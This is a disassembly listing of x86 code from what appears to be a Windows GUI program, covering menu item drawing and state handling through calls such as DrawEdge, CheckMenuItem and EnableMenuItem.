mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404524
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4252cc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45be38
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425acc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4252cc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4252cc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a2b0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252a0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45fdc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4292ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_424b00
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45be38
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252cc
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45ee24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424dcc
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425acc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4257f4
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45c128
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425acc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4255c4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_424b00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40331c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45ee24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46028b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45dee8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_42592c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45ee24
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4603d8
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_460dbc
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_460408
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_460454
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_460636
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403518
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_460408
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_460dbc
mov esi eax
mov eax edi
call sub_4603d8
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404524
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402d00
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041b0
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45dee8
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404424
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46063d
lea eax [ ebp - 0x24 ]
call sub_404118
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45ee24
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_460668
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404524
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40416c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_460690
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_460800
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_460810
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_4606d8
sub_4606d8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45ed94
push eax
call CheckMenuItem
mov eax esi
call sub_460690
sub_46072c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_460800
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45ed94
push eax
call EnableMenuItem
sub_4607a4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_460b64
mov edx eax
mov ecx ebx
mov eax edi
call sub_45ed34
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_460690
sub_460810
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418cf8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45de3c
sub_460880
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_460800
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_460868
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_460b98
mov ecx ebx
mov edx esi
mov eax edi
call sub_46098c
sub_4608c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_460800
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_460810
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_460920
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_460800
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
